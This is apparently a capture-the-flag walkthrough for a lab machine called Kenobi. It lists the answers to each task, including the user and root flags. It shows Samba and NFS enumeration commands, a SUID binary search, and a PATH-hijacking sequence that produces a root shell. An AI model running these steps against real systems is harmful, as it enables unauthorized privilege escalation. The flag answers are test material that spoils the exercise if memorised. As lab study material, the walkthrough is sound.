# Kenobi
Walkthrough on exploiting a Linux machine. Enumerate Samba for shares, manipulate a vulnerable version of proftpd and escalate your privileges with path variable manipulation.

## Task 1 Deploy the vulnerable machine

### Make sure you're connected to our network and deploy the machine
Deploy the machine

### Scan the machine with nmap, how many ports are open?

```
7
```

## Task 2 Enumerating Samba for shares

### nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse MACHINE_IP
Using the nmap command above, how many shares have been found?

```
3
```

### smbclient //<ip>/anonymous
Once you're connected, list the files on the share. What is the file can you see?

```
log.txt
```

### smbget -R smb://<ip>/anonymous
What port is FTP running on?
```
21
```

### nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.186.207
What mount can we see?

```
/var
```


## Task 3 Gain initial access with ProFtpd

### What is the version?
```
1.3.5
```

### We can use searchsploit to find exploits for a particular software version.
Searchsploit is basically just a command line search tool for exploit-db.com.
How many exploits are there for the ProFTPd running?

```
3
```

### Lets mount the /var/tmp directory to our machine
What is Kenobi's user flag (/home/kenobi/user.txt)?

```
d0b0f3f53b6caa532a83915e19224899
```


## [Task 4] Privilege Escalation with Path Variable Manipulation

### What file looks particularly out of the ordinary? 
```
$ find / -perm -u=s -type f 2>/dev/null

/usr/bin/menu
```

### Run the binary, how many options appear?
```
3
```

### What is the root flag (/root/root.txt)?
```
echo /bin/sh > /tmp/curl
chmod 777 /tmp/curl
export PATH=/tmp:$PATH

/usr/bin/menu

cat /root/root.txt

177b3cd8562289f37382721c28381f02
```
